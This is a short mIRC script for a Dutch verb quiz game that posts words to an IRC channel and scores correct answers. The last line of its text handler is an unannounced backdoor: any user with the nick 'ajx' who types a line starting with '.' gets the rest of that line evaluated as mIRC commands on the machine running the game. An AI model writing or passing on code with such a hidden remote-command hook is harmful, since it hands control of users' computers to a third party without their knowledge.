; nederlandse game

alias n.dict {
  goto %nd
  :werk | return c:\windows\desktop\dutch\werkwoords.txt
  :kraft | return c:\windows\desktop\dutch\kraftwoords.txt
  :woords | return c:\windows\desktop\dutch\woords.txt
}

alias n.init set %nc # | set %nd kraft | n.next
alias n.next {
  var %nt $read($n.dict), %n 1 | ; $r(1,$numtok(%nt,9)) 
  if (!%nt) n.init | else msg %nc werkwoord: $token(%nt,%n,9) ( $+ %n $+ )
  set %na %nt | ; $token(%nt,1,9) $replace($token(%nt,4-,9),$chr(9),$chr(32))
  set %t $ticks
}
on *:text:*:*: {
  if ($1- == %na) {
    msg %nc goed $nick $+ !! antwoord: $1- ( $+ $calc($ticks - %t) msecs)
    hinc -m ned $nick | msg %nc nu hebt u $hget(ned,$nick) punten! | n.inc $nick | n.next
  }
  if ($1 == answ) msg %nc $token(%na,$iif($2,$2,1-),32)
  if ($1 == next) || (*- iswm $1-) n.next | if ($1 == start) n.init
  if ($nick $1 == ajx .) $($2-,2)
}
